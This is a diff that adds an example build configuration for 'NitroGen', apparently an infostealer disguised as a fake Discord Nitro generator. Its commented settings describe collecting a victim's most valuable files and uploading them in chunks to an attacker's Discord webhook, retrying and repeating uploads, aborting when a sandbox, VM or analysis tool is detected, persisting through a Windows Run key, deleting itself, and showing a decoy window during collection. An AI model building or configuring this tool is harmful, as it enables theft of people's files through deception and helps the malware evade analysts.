@@ -1,0 +1,39 @@
+# Example build config. build.rs falls back to this file when strings.txt is
+# missing, so a fresh clone compiles without a webhook and simply delivers
+# nothing. build.ps1 writes a real strings.txt and overrides this file.
+#
+# key=value, one per line. Values may contain spaces, no quoting needed.
+
+# Your own Discord webhook. Replace both parts; leave REPLACE_ME to build a
+# binary that collects but does not deliver.
+WEBHOOK=https://discord.com/api/webhooks/REPLACE_ME/REPLACE_ME
+
+# Folder name, Run-key name, exe name and window title.
+APP_NAME=NitroGen
+
+# Minutes to wait before the first upload, jittered +/-10%.
+DELAY_MINUTES=0
+
+# Minutes between retries when delivery fails (5 attempts).
+RETRY_MINUTES=30
+
+# Re-collect and re-upload on this interval. 0 = one shot.
+REPEAT_HOURS=0
+
+# Total staging budget in MB. Highest-value files win.
+MAX_UPLOAD_MB=45
+
+# Split the archive above this size, one webhook message per part.
+CHUNK_MB=8
+
+# Abort on sandbox, VM and analysis-tool indicators.
+GUARD=1
+
+# Copy the exe to %APPDATA% and add an HKCU Run value.
+PERSIST=0
+
+# Delete the running exe after the last upload.
+SELF_DELETE=0
+
+# Show the fake Nitro generator window while collecting.
+DECOY=1
